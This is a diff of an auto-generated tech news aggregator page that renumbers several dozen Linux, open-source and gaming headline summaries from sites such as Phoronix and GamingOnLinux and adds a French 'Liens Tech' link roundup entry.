 
-### 54. `EN` [AMD Preparing Linux Kernel For "RMPOPT" To Help Reduce Overhead On SEV-SNP Servers](data/articles/448c0a8df39d0a748ba1ed66f717857f.html)
+### 55. `EN` [AMD Preparing Linux Kernel For "RMPOPT" To Help Reduce Overhead On SEV-SNP Servers](data/articles/448c0a8df39d0a748ba1ed66f717857f.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 AMD sent out a set of Linux kernel patches today for enabling use of a new instruction dubbed RMPOPT. Given the timing of these patches, RMPOPT is presumably a feature coming with next-gen AMD EPYC Zen 6 "Venice" processors...
 
@@ -7122,7 +7157,7 @@ AMD sent out a set of Linux kernel patches today for enabling use of a new instr
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
 
-### 55. `EN` [Linux 7.0 Lands New TI RGB LED Driver With "Autonomous Animation Engine" Control](data/articles/a898e8543d956c59e58a76e9d04d5b04.html)
+### 56. `EN` [Linux 7.0 Lands New TI RGB LED Driver With "Autonomous Animation Engine" Control](data/articles/a898e8543d956c59e58a76e9d04d5b04.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 The LED subsystem updates for the Linux kernel typically aren't too noteworthy each kernel cycle but with Linux 7.0 is a new TI RGB LED driver that captured my attention in being curious over its "autonomous animation engine" integration...
 
@@ -7130,7 +7165,7 @@ The LED subsystem updates for the Linux kernel typically aren't too noteworthy e
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 56. `EN` [Earth vs Mars the Advance Wars-like from Relic Entertainment gets Steam Deck Verified](data/articles/88b230e5c1d2911f0bdc1dcb12a50340.html)
+### 57. `EN` [Earth vs Mars the Advance Wars-like from Relic Entertainment gets Steam Deck Verified](data/articles/88b230e5c1d2911f0bdc1dcb12a50340.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Relic Entertainment produced their own Advance Wars-like strategy game with Earth vs Mars from a smaller team, and now it is updated to be Steam Deck Verified. Read the full article on GamingOnLinux.
 
@@ -7138,7 +7173,7 @@ Relic Entertainment produced their own Advance Wars-like strategy game with Eart
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 57. `EN` [SCOPECREEP is a curious mix of tower defense and active incremental where you collect souls](data/articles/b156ad56f0e2b0f6e0d7aa2ba01ae19a.html)
+### 58. `EN` [SCOPECREEP is a curious mix of tower defense and active incremental where you collect souls](data/articles/b156ad56f0e2b0f6e0d7aa2ba01ae19a.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Go through exorcisms to collect souls and repeatedly click through a vast network of additional upgrades and abilities in SCOPECREEP. Read the full article on GamingOnLinux.
 
@@ -7146,7 +7181,7 @@ Go through exorcisms to collect souls and repeatedly click through a vast networ
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 58. `EN` [Check out the full second episode of Games For Everyone](data/articles/cdf8154dbee1a0970eaece2654817a1b.html)
+### 59. `EN` [Check out the full second episode of Games For Everyone](data/articles/cdf8154dbee1a0970eaece2654817a1b.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Games For Everyone has returned for Episode 2, going over our thoughts on various Linux gaming related subjects. Read the full article on GamingOnLinux.
 
@@ -7154,7 +7189,7 @@ Games For Everyone has returned for Episode 2, going over our thoughts on variou
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 59. `EN` [Astro Protocol is a tactical space 4x game designed for people with little time](data/articles/cb3e7a5104d5eb6d0684944734b54fcb.html)
+### 60. `EN` [Astro Protocol is a tactical space 4x game designed for people with little time](data/articles/cb3e7a5104d5eb6d0684944734b54fcb.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 I sure do love 4x strategy games, but they really can take forever - which is where Astro Protocol is different with its tactical approach. Read the full article on GamingOnLinux.
 
@@ -7162,7 +7197,7 @@ I sure do love 4x strategy games, but they really can take forever - which is wh
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 60. `EN` [KDE Plasma 6.6 released with improved accessibility, new on-screen keyboard and lots more](data/articles/9a3882965d07257acdc94986e5e551f8.html)
+### 61. `EN` [KDE Plasma 6.6 released with improved accessibility, new on-screen keyboard and lots more](data/articles/9a3882965d07257acdc94986e5e551f8.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 The KDE team have released KDE Plasma 6.6, the latest new feature update to the popular Linux desktop environment with lots of goodies. Read the full article on GamingOnLinux.
 
@@ -7170,7 +7205,7 @@ The KDE team have released KDE Plasma 6.6, the latest new feature update to the 
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
 
-### 61. `EN` [Nova Lake S Support Added To Intel LPSS Driver In Linux 7.0](data/articles/cd7d972728ab89fdca28de6886e0b600.html)
+### 62. `EN` [Nova Lake S Support Added To Intel LPSS Driver In Linux 7.0](data/articles/cd7d972728ab89fdca28de6886e0b600.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 The latest Nova Lake enablement work for the Linux kernel to land is adding support for Nova Lake S platforms to the Intel LPSS driver in the upcoming Linux 7.0 kernel...
 
@@ -7178,7 +7213,7 @@ The latest Nova Lake enablement work for the Linux kernel to land is adding supp
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 62. `EN` [Valve confirm Steam Deck stock issues due to "memory and storage shortages"](data/articles/0df117d7aaa70c9f2a94cbae1d5ce626.html)
+### 63. `EN` [Valve confirm Steam Deck stock issues due to "memory and storage shortages"](data/articles/0df117d7aaa70c9f2a94cbae1d5ce626.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 We reported recently how the Steam Deck was completely out of stock in the USA, Canada and Asia and now Valve have put up a short statement on it. Read the full article on GamingOnLinux.
 
@@ -7186,7 +7221,7 @@ We reported recently how the Steam Deck was completely out of stock in the USA, 
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
 
-### 63. `EN` [KDE Plasma 6.6 Released With Many Excellent Improvements](data/articles/0159ecb21f18edf0f65677e021bc780e.html)
+### 64. `EN` [KDE Plasma 6.6 Released With Many Excellent Improvements](data/articles/0159ecb21f18edf0f65677e021bc780e.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 KDE Plasma 6.6 is now officially out as the newest feature update to this prominent open-source desktop environment. Plasma 6.6 is self-described by KDE developers as "the best desktop in the known universe (according to us). Plasma 6.6 is all about making your life as easy as possible without sacrificing any of the flexibility."..
 
@@ -7194,7 +7229,7 @@ KDE Plasma 6.6 is now officially out as the newest feature update to this promin
 
 <div class="article-item" data-lang="fr" data-category="linux" data-source="Journal du Hacker">
 
-### 64. `FR` [Meishi défie Apple/Google: Contacts P2P E2EE Open Source](data/articles/9c4a0ea64383d16fa35602fb075cdafd.html)
+### 65. `FR` [Meishi défie Apple/Google: Contacts P2P E2EE Open Source](data/articles/9c4a0ea64383d16fa35602fb075cdafd.html)
 **Source:** Journal du Hacker | **Keyword:** `Hacking`
 Le problème
 Combien de copies de vos coordonnées existent actuellement ? Qui les détient ? sont-elles utilisées ? Nous avons perdu le contrôle de nos données, ou plutôt, nous ne l’avons jamais eu. Les géants de la technologie contrôlent des milliards de bases de données de contacts. Les gouvernements développent des identités numériques centralisées (EUDI Wallet EU en 2026). Nous subissons : violations de données, spam, absence totale de contrôle.
@@ -7210,7 +7245,7 @@ Hybride : client-serveur uniquement pour les données publiques, P2P pour le res
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
 
-### 65. `EN` [Idea Raised For Nicer DRM Panic Screen Integration On Fedora Linux](data/articles/26e960e93741628accd2698387dafe96.html)
+### 66. `EN` [Idea Raised For Nicer DRM Panic Screen Integration On Fedora Linux](data/articles/26e960e93741628accd2698387dafe96.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 DRM Panic is the Linux kernel infrastructure now supported by most of the Direct Rendering Manager (DRM) kernel graphics/display drivers for being able to render a QR code kernel error message or similar when a kernel panic occurs to provide a cleaner interface should your system run into serious problems. An idea has been raised now within the Fedora Linux camp to provide an improved experience around this feature akin to Windows' "Blue Screen of Death" functionality...
 
@@ -7218,7 +7253,7 @@ DRM Panic is the Linux kernel infrastructure now supported by most of the Direct
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="LWN.net">
 
-### 66. `EN` [[$] Open source security in spite of AI](data/articles/f728daaa7418ef84d0362e325a5c8331.html)
+### 67. `EN` [[$] Open source security in spite of AI](data/articles/f728daaa7418ef84d0362e325a5c8331.html)
 **Source:** LWN.net | **Keyword:** `Development`
 The curl project has found AI-powered tools to be a mixed bag when
 it comes to security reports. At FOSDEM 2026, curl creator and
@@ -7231,7 +7266,7 @@ find flaws that other tools have missed.
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
 
-### 67. `EN` [Linux 7.0 Driver Core Changes Bring More Enhancements For Rust Kernel Drivers](data/articles/74a8ee13589fe99fd24f29be0daa3c05.html)
+### 68. `EN` [Linux 7.0 Driver Core Changes Bring More Enhancements For Rust Kernel Drivers](data/articles/74a8ee13589fe99fd24f29be0daa3c05.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 Merged a few days ago for the Linux 7.0 kernel were all of the driver core enhancements. As has been the common theme in recent kernel releases, a lot of the driver core code churn revolves around additions for allowing more Rust kernel driver usage...
 
@@ -7239,7 +7274,7 @@ Merged a few days ago for the Linux 7.0 kernel were all of the driver core enhan
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 68. `EN` [Space strategy game Battlestar Galactica: Scattered Hopes has a demo out now](data/articles/0d7d2b13611f639abd8a196e77259a46.html)
+### 69. `EN` [Space strategy game Battlestar Galactica: Scattered Hopes has a demo out now](data/articles/0d7d2b13611f639abd8a196e77259a46.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Battlestar Galactica is one of the best space sci-fi series around, and now you have a chance to explore more in Battlestar Galactica: Scattered Hopes. Read the full article on GamingOnLinux.
 
@@ -7247,7 +7282,7 @@ Battlestar Galactica is one of the best space sci-fi series around, and now you 
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
 
-### 69. `EN` [Linux 6.19.2 &amp; Other LTS Kernels Released To Fix Systems Not Booting](data/articles/3bcbc9bb7115e712b1b2efa654e729c0.html)
+### 70. `EN` [Linux 6.19.2 &amp; Other LTS Kernels Released To Fix Systems Not Booting](data/articles/3bcbc9bb7115e712b1b2efa654e729c0.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 Linux 6.19.1 was released earlier today while it's since been replaced by Linux 6.19.2 to address fallout from that first point release with some systems not booting. This also resulted in new LTS kernel releases too due to the problematic code being picked up there too...
 
@@ -7255,7 +7290,7 @@ Linux 6.19.1 was released earlier today while it's since been replaced by Linux 
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Its FOSS">
 
-### 70. `EN` [Reverse Engineering Linux Distro REMnux Marks 15 Years With Major v8 Release Featuring AI Agent Support](data/articles/8e3c2734715491ed75ac11fcd406577d.html)
+### 71. `EN` [Reverse Engineering Linux Distro REMnux Marks 15 Years With Major v8 Release Featuring AI Agent Support](data/articles/8e3c2734715491ed75ac11fcd406577d.html)
 **Source:** Its FOSS | **Keyword:** `Linux`
 Malware analysis Linux distro gets Ubuntu 24.04 base, a new installer, and many new tools.
 
@@ -7263,7 +7298,7 @@ Malware analysis Linux distro gets Ubuntu 24.04 base, a new installer, and many 
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 71. `EN` [ABIDE is an extreme stop-motion horror game from the devs of Judero and Mashina](data/articles/dbb2395b1fe173091ee4a8f39b2508bb.html)
+### 72. `EN` [ABIDE is an extreme stop-motion horror game from the devs of Judero and Mashina](data/articles/dbb2395b1fe173091ee4a8f39b2508bb.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Set in a secluded community retreat that uses various therapeutic techniques to try and rehabilitate its residents, ABIDE certainly looks to be different. Read the full article on GamingOnLinux.
 
@@ -7271,7 +7306,7 @@ Set in a secluded community retreat that uses various therapeutic techniques to 
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 72. `EN` [Comedy co-op physics platformer Log Riders adds Linux support and looks hilarious](data/articles/df51ed2c318f93880bfa89b05486a213.html)
+### 73. `EN` [Comedy co-op physics platformer Log Riders adds Linux support and looks hilarious](data/articles/df51ed2c318f93880bfa89b05486a213.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Log Riders is a co-op platformer around running on top of wooden logs, it looks hilarious and now there's full Native Linux support too. Read the full article on GamingOnLinux.
 
@@ -7279,7 +7314,7 @@ Log Riders is a co-op platformer around running on top of wooden logs, it looks 
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 73. `EN` [Get some quality horror in the Love You to Death Humble Bundle](data/articles/641a7ab0c5b8d03839b4c0a358516442.html)
+### 74. `EN` [Get some quality horror in the Love You to Death Humble Bundle](data/articles/641a7ab0c5b8d03839b4c0a358516442.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 The Love You to Death Humble Bundle has some highly rated scarier experiences for cheaps, here's your usual run over what games you can get in it. Read the full article on GamingOnLinux.
 
@@ -7287,7 +7322,7 @@ The Love You to Death Humble Bundle has some highly rated scarier experiences fo
 
 <div class="article-item" data-lang="fr" data-category="linux" data-source="Journal du Hacker">
 
-### 74. `FR` [Murena Maps : l'app qui veut te faire oublier Google Maps](data/articles/205879e808446ded185c3ee9099e4020.html)
+### 75. `FR` [Murena Maps : l'app qui veut te faire oublier Google Maps](data/articles/205879e808446ded185c3ee9099e4020.html)
 **Source:** Journal du Hacker | **Keyword:** `Hacking`
 Vous vous souvenez de la dernière fois où vous avez demandé ton chemin à un inconnu ? C’était il y a une éternité, car nos smartphones ont rendu la navigation d’une simplicité enfantine. Mais cette facilité a un prix, car Google analyse votre vitesse, vos trajets et vos habitudes pour enrichir votre profil. C’est pour briser ce cycle que l’équipe de Murena (/e/OS) vient de dévoiler Murena Maps, une application cartographique intuitive qui place la vie privée au sommet de ses priorités.
 L’un des freins majeurs des solutions open source comme OSMand est souvent la nécessité de télécharger des gigaoctets de cartes avant de pouvoir improviser un trajet. Murena Maps prend le contre-pied, car l’application fonctionne nativement en ligne avec les données OpenStreetMap. Elle offre une précision immédiate sans encombrer la mémoire du téléphone, tout en garantissant qu’aucune donnée de localisation n’est vendue à des tiers.
@@ -7296,7 +7331,7 @@ L’un des freins majeurs des solutions open source comme OSMand est souvent la 
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 75. `EN` [Clean the infected family PC in the new Antivirus Survivors 2003 Professional demo](data/articles/08d8b8b8f96ba3c2144920dee5107153.html)
+### 76. `EN` [Clean the infected family PC in the new Antivirus Survivors 2003 Professional demo](data/articles/08d8b8b8f96ba3c2144920dee5107153.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Antivirus Survivors 2003 Professional takes the idea of Vampire Survivors and everything similar, and turns you into a mouse cursor inside an infected PC. Read the full article on GamingOnLinux.
 
@@ -7304,7 +7339,7 @@ Antivirus Survivors 2003 Professional takes the idea of Vampire Survivors and ev
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 76. `EN` [X4: Foundations is getting cross-platform cloud saves - possible breakage coming for Linux](data/articles/2545b3a6db64dfd0f9b88711f76ebd64.html)
+### 77. `EN` [X4: Foundations is getting cross-platform cloud saves - possible breakage coming for Linux](data/articles/2545b3a6db64dfd0f9b88711f76ebd64.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Egosoft have announced that X4: Foundations is finally getting cross-platform Steam Cloud saves, but desktop Linux users may need to make some backups. Read the full article on GamingOnLinux.
 
@@ -7312,7 +7347,7 @@ Egosoft have announced that X4: Foundations is finally getting cross-platform St
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 77. `EN` [Blue Archive devs confirm Steam Deck and controller support is on the way](data/articles/72959db1712f6c112f6d35e0505821e2.html)
+### 78. `EN` [Blue Archive devs confirm Steam Deck and controller support is on the way](data/articles/72959db1712f6c112f6d35e0505821e2.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 The free to play Blue Archive from NEXON arrived on Steam last year, and they've confirmed upgrades are coming for Steam Deck and controller players. Read the full article on GamingOnLinux.
 
@@ -7320,7 +7355,7 @@ The free to play Blue Archive from NEXON arrived on Steam last year, and they've
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 78. `EN` [Thoroughly strange dungeon crawler Pluto is all about constructing spells and using your fingers](data/articles/8331d5328b638ed5a6073ab0655c11a9.html)
+### 79. `EN` [Thoroughly strange dungeon crawler Pluto is all about constructing spells and using your fingers](data/articles/8331d5328b638ed5a6073ab0655c11a9.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 With a pretty creepy looking style, the dungeon crawler Pluto is all about experimentation as you construct spells and wiggle your fingers. Read the full article on GamingOnLinux.
 
@@ -7328,15 +7363,23 @@ With a pretty creepy looking style, the dungeon crawler Pluto is all about exper
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 79. `EN` [The clever ASCII animated Stone Story RPG is getting a full standalone sequel](data/articles/df22249a951b63974d7547addb97d33a.html)
+### 80. `EN` [The clever ASCII animated Stone Story RPG is getting a full standalone sequel](data/articles/df22249a951b63974d7547addb97d33a.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Stone Story Ascension was recently revealed as the full standalone follow-up to the impressive Stone Story RPG. Read the full article on GamingOnLinux.
 
 </div>
 
+<div class="article-item" data-lang="nl" data-category="linux" data-source="Journal du Hacker">
+
+### 81. `EN` [Liens Tech - Février 2026](data/articles/fd06ec04ae61ac4e431398b7c29fdc59.html)
+**Source:** Journal du Hacker | **Keyword:** `Hacking`
+Liens Tech, c’est notre façon de partager ce qu'on découvre au fil de nos explorations : des outils, projets et ressources qui nous ont intrigué, simplifié la vie ou simplement donné envie d’expérimenter. Une veille sans prétention, juste le plaisir de chercher, tester et partager ce qui vaut le détour.Voici notre sélection du mois.plakarPrésentation : Plakar est une solution de sauvegarde open-source conçue pour simplifier la protection des données grâce à des snapshots chiffrés, compressés et dédupliqués. Elle offre une interface CLI + UI qui permet de parcourir, restaurer ou synchroniser des sauvegardes depuis ou vers différents supports (local, cloud, objets, SaaS). : Je suis en cours de test de Plakar et j’ai été jusqu'ici séduit par sa simplicité et son efficacité. La sauvegarde en snapshots dédupliqués fonctionne très bien. Un outil encore jeune, mais prometteur.GitHub - PlakarKorp/plakar: plakar is a backup solution powered by Kloset and ptarplakar is a backup solution powered by Kloset and ptar - PlakarKorp/plakarGitHubPlakarKorpNetworking ToolboxPrésentation : Networking Toolbox est une collection open-source d’outils réseau rassemblés dans une interface web unique, développée par Lissy93. Elle regroupe diagnostics, tests de connectivité et visualisations pour simplifier le dépannage et l’analyse réseau depuis un seul tableau de bord. : J’aime beauco
+
+</div>
+
 <div class="article-item" data-lang="en" data-category="linux" data-source="OMG! Ubuntu">
 
-### 80. `EN` [Ubuntu 26.04 splits firmware package to reduce update sizes](data/articles/8959a5abaa831ce8c6e6c38984147e7d.html)
+### 82. `EN` [Ubuntu 26.04 splits firmware package to reduce update sizes](data/articles/8959a5abaa831ce8c6e6c38984147e7d.html)
 **Source:** OMG! Ubuntu | **Keyword:** `Linux`
 Ubuntu 26.04 LTS will split its 600MB linux-firmware package into 17 vendor-specific packages to reduce bandwidth and download sizes of firmware updates.
 You're reading Ubuntu 26.04 splits firmware package to reduce update sizes, a blog post from OMG! Ubuntu. Do not reproduce elsewhere without permission.
@@ -7345,7 +7388,7 @@ You're reading Ubuntu 26.04 splits firmware package to reduce update sizes, a bl
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="OMG! Ubuntu">
 
-### 81. `EN` [Linux Mint is adding post-install home encryption option](data/articles/92c11e1e94bf223679d5d2e5bf4be63c.html)
+### 83. `EN` [Linux Mint is adding post-install home encryption option](data/articles/92c11e1e94bf223679d5d2e5bf4be63c.html)
 **Source:** OMG! Ubuntu | **Keyword:** `Linux`
 Linux Mint 23 will expand its System Administration tool (mintsysadm) with a new Users section, enabling post-install home encryption and more.
 You're reading Linux Mint is adding post-install home encryption option, a blog post from OMG! Ubuntu. Do not reproduce elsewhere without permission.
@@ -7354,7 +7397,7 @@ You're reading Linux Mint is adding post-install home encryption option, a blog 
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 82. `EN` [Starship Troopers: Ultimate Bug War gets a satisfying demo and release date](data/articles/e246fdd9a97eb93784e5ecf895c69677.html)
+### 84. `EN` [Starship Troopers: Ultimate Bug War gets a satisfying demo and release date](data/articles/e246fdd9a97eb93784e5ecf895c69677.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 The retro single-player FPS Starship Troopers: Ultimate Bug War! has a demo available on Steam and it's going to release March 16th. Read the full article on GamingOnLinux.
 
@@ -7362,7 +7405,7 @@ The retro single-player FPS Starship Troopers: Ultimate Bug War! has a demo avai
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 83. `EN` [Star Trek: Voyager - Across the Unknown demo upgraded with voice-over](data/articles/793ad919db1d34e2a102d2a47cb62aab.html)
+### 85. `EN` [Star Trek: Voyager - Across the Unknown demo upgraded with voice-over](data/articles/793ad919db1d34e2a102d2a47cb62aab.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Star Trek: Voyager - Across the Unknown has an upgraded Steam demo ahead of release, with a teaser of new voice-overs and the proper music. Read the full article on GamingOnLinux.
 
@@ -7370,7 +7413,7 @@ Star Trek: Voyager - Across the Unknown has an upgraded Steam demo ahead of rele
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 84. `EN` [OldUnreal add new installers for Unreal Tournament 2004, Unreal Tournament: GOTY and Unreal Gold](data/articles/86cf8cf9a81db4aa527653605e84be0d.html)
+### 86. `EN` [OldUnreal add new installers for Unreal Tournament 2004, Unreal Tournament: GOTY and Unreal Gold](data/articles/86cf8cf9a81db4aa527653605e84be0d.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Along with their new installers for each classic game, they have a big Unreal Tournament 2004 patch in preview with overhauled Linux and macOS support. Read the full article on GamingOnLinux.
 
@@ -7378,7 +7421,7 @@ Along with their new installers for each classic game, they have a big Unreal To
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 85. `EN` [Dino Crisis 1 and 2 arrive on Steam but they need tweaks to run on Linux / SteamOS](data/articles/906143cba81504b98110e5c5acd4f59e.html)
+### 87. `EN` [Dino Crisis 1 and 2 arrive on Steam but they need tweaks to run on Linux / SteamOS](data/articles/906143cba81504b98110e5c5acd4f59e.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 After arriving on GOG early in 2025, Dino Crisis 1 and 2 are now available directly on Steam but they have issues running on Linux / SteamOS. Read the full article on GamingOnLinux.
 
@@ -7386,7 +7429,7 @@ After arriving on GOG early in 2025, Dino Crisis 1 and 2 are now available direc
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 86. `EN` [Death Stranding 2 for PC and lots more from Sony State of Play (February 2026)](data/articles/2b1a4efdea92fdc88674684d58a05d0b.html)
+### 88. `EN` [Death Stranding 2 for PC and lots more from Sony State of Play (February 2026)](data/articles/2b1a4efdea92fdc88674684d58a05d0b.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Sony State of Play for February 2026 happened last night, and we finally got the Death Stranding 2: On the Beach PC release announcement. Plus various others. Read the full article on GamingOnLinux.
 
@@ -7394,7 +7437,7 @@ Sony State of Play for February 2026 happened last night, and we finally got the
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 87. `EN` [Blades of Fire is jumping from Epic to Steam with big upgrades and Steam Deck support](data/articles/c27fe987d36e35d85de0ea810ad11a7d.html)
+### 89. `EN` [Blades of Fire is jumping from Epic to Steam with big upgrades and Steam Deck support](data/articles/c27fe987d36e35d85de0ea810ad11a7d.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 After being an Epic Exclusive, the action-adventure Blades of Fire from MercurySteam and 505 Games is arriving on Steam on May 14th. Read the full article on GamingOnLinux.
 
@@ -7402,7 +7445,7 @@ After being an Epic Exclusive, the action-adventure Blades of Fire from MercuryS
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 88. `EN` [More Total War games arrive on GOG along with a return of The Long Dark](data/articles/834b40f224c53b93c18f57cc68f15a03.html)
+### 90. `EN` [More Total War games arrive on GOG along with a return of The Long Dark](data/articles/834b40f224c53b93c18f57cc68f15a03.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 GOG has more goodies available for fans of DRM-free gaming with the release of more Total War games, and The Long Dark has returned as well. Read the full article on GamingOnLinux.
 
@@ -7410,7 +7453,7 @@ GOG has more goodies available for fans of DRM-free gaming with the release of m
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Its FOSS">
 
-### 89. `EN` [Mitchell Hashimoto Launches 'Vouch' to Fight AI Slop in Open Source Ecosystem](data/articles/7b294273294900e6db76786e5c45c3ad.html)
+### 91. `EN` [Mitchell Hashimoto Launches 'Vouch' to Fight AI Slop in Open Source Ecosystem](data/articles/7b294273294900e6db76786e5c45c3ad.html)
 **Source:** Its FOSS | **Keyword:** `Linux`
 New tool helps open source projects manage the scourge of AI slop.
 
@@ -7418,7 +7461,7 @@ New tool helps open source projects manage the scourge of AI slop.
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 90. `EN` [The 'No ICE in Minnesota' charity bundle is live on itch.io](data/articles/3ca317ab9161d3ff17a2fd9eafdf4b50.html)
+### 92. `EN` [The 'No ICE in Minnesota' charity bundle is live on itch.io](data/articles/3ca317ab9161d3ff17a2fd9eafdf4b50.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Another chance for you to score a whole lot of games, while also supporting charity in the "No ICE in Minnesota" bundle on itch.io. Read the full article on GamingOnLinux.
 
@@ -7426,7 +7469,7 @@ Another chance for you to score a whole lot of games, while also supporting char
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 91. `EN` [Gothic 1 Remake gets a June release date](data/articles/c815206db90c4ec74a8021a1479422b7.html)
+### 93. `EN` [Gothic 1 Remake gets a June release date](data/articles/c815206db90c4ec74a8021a1479422b7.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 THQ Nordic have just revealed that the Gothic 1 Remake is now set for release on June 5th. Read the full article on GamingOnLinux.
 
@@ -7434,7 +7477,7 @@ THQ Nordic have just revealed that the Gothic 1 Remake is now set for release on
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 92. `EN` [How Many Dudes does it take to beat 1 horse-sized duck and 75 duck-sized horses? This game answers your dumb questions](data/articles/ec614e0d2ce0be3cb895f04a7f1594f7.html)
+### 94. `EN` [How Many Dudes does it take to beat 1 horse-sized duck and 75 duck-sized horses? This game answers your dumb questions](data/articles/ec614e0d2ce0be3cb895f04a7f1594f7.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 If you love games that are a bit on the stupid side, the auto-battling roguelike How Many Dudes? may answer a few of your dumbest questions. Read the full article on GamingOnLinux.
 
@@ -7442,7 +7485,7 @@ If you love games that are a bit on the stupid side, the auto-battling roguelike
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 93. `EN` [Diablo II: Resurrected – Infernal Edition gets released on Steam and Steam Deck Verified](data/articles/d13f4f9c5047f2c2e7c3aed1032d0356.html)
+### 95. `EN` [Diablo II: Resurrected – Infernal Edition gets released on Steam and Steam Deck Verified](data/articles/d13f4f9c5047f2c2e7c3aed1032d0356.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Blizzard released Diablo II: Resurrected - Infernal Edition on Steam, a newly upgraded version of the classic action RPG and it's Steam Deck Verified too. Read the full article on GamingOnLinux.
 
@@ -7450,7 +7493,7 @@ Blizzard released Diablo II: Resurrected - Infernal Edition on Steam, a newly up
 
 <div class="article-item" data-lang="fr" data-category="linux" data-source="Its FOSS">
 
-### 94. `FR` [Linux Mint Wants Fewer Releases Each Year (For Good Reasons)](data/articles/1781215ac9e91fc611acf7c1f9a16154.html)
+### 96. `FR` [Linux Mint Wants Fewer Releases Each Year (For Good Reasons)](data/articles/1781215ac9e91fc611acf7c1f9a16154.html)
 **Source:** Its FOSS | **Keyword:** `Linux`
 Lead developer says frequent releases leave little time for development.
 
@@ -7458,7 +7501,7 @@ Lead developer says frequent releases leave little time for development.
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="OMG! Ubuntu">
 
-### 95. `EN` [Linux Mint may make fewer releases a year to ‘uncap ambition’](data/articles/2568d5d75df9766403d023360938e3f7.html)
+### 97. `EN` [Linux Mint may make fewer releases a year to ‘uncap ambition’](data/articles/2568d5d75df9766403d023360938e3f7.html)
 **Source:** OMG! Ubuntu | **Keyword:** `Linux`
 Linux Mint developers are considering ending the distro’s six‑month release cycle, a change that could mean fewer updates and a slower release pace.
 You're reading Linux Mint may make fewer releases a year to ‘uncap ambition’, a blog post from OMG! Ubuntu. Do not reproduce elsewhere without permission.
@@ -7467,7 +7510,7 @@ You're reading Linux Mint may make fewer releases a year to ‘uncap ambition’
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
